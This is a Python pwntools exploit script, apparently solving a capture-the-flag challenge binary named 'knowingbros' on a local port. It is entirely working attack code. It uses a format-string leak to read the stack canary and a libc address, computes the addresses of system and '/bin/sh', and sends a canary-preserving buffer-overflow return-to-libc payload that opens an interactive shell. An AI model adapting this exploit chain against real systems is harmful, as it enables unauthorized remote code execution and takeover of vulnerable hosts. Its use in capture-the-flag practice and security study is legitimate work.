#!/usr/bin/env python
from pwn import *

stdin_offset = 0x1d85c0
system_offset = 0x3d200
binsh_offset = 0x17e0cf

p = remote('localhost', 18000)
# context(terminal=['tmux', 'new-window'])
# p = process('./knowingbros')
# gdb.attach(p, '''''')
# p = gdb.debug('./knowingbros', '''
# break *0x56555725''')

# context(os='linux', arch='i386')

p.recvuntil('> ')
p.sendline('0') # Echo
p.recvuntil('> ')
p.sendline('%2$p %7$p') # Get canary and stdin address

stdin_real, canary = [int(x,16) for x in p.recvuntil('> ').split('\n')[0].split(' ')]
log.info('Leaked stack canary  : 0x{0:0{1}X}'.format(canary, 8))
log.info('Leaked stdin addr    : 0x{0:0{1}X}'.format(stdin_real, 8))

libcbase = stdin_real - stdin_offset
log.info('LIBC base address    : 0x{0:0{1}X}'.format(libcbase, 8))

canary = p32(canary)
systemaddr = p32(libcbase + system_offset)
log.info('System address       : 0x{0:0{1}X}'.format(libcbase+system_offset, 8))

binsh = p32(libcbase + binsh_offset)
log.info('/bin/sh address      : 0x{0:0{1}X}'.format(libcbase+binsh_offset, 8))

p.sendline('1') # SendKnowledge
p.recvuntil('> ')
payload = 'A' * 32                  # padding
payload += canary                   # leaked stack canary
payload += 'JUNK' * 3               # padding
payload += systemaddr               # libc system addr
payload += 'JUNK'                   # return after system
payload += binsh                    # addr of /bin/sh

p.sendline(payload)
p.clean(1)
p.interactive()

p.close()